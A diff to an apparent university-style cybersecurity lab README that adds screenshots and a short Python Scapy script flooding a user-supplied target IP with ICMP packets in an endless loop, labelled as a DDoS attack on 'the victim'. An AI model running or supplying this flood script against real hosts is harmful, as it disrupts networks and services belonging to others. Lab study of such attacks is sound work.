@@ -25,10 +25,29 @@ Dns Spoof Host
 
   ### b. Use ICMP Packets to perform only DDOS attacks over the victim. 
 
+![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/86edcb21-1696-4996-bd73-bc886422d8e8)
 
+![image](https://github.com/jayshah17/Implementation-of-Cyber-Security-Lab/assets/76842630/bac150a5-3d56-4bf6-87b2-89101e60a150)
 
+```
+from scapy.all import *
 
+# Function to send ICMP packets
+def send_icmp_packet(dst_ip):
+    icmp_packet = IP(dst=dst_ip)/ICMP()
+    send(icmp_packet, loop=True, verbose=False)
 
+# Main function
+def main():
+    target_ip = input("Enter the target IP address: ")
+    while True:
+        send_icmp_packet(target_ip)
+
+if __name__ == "__main__":
+    main()
+```
+
+DDOS Attack is performed
 
 
 
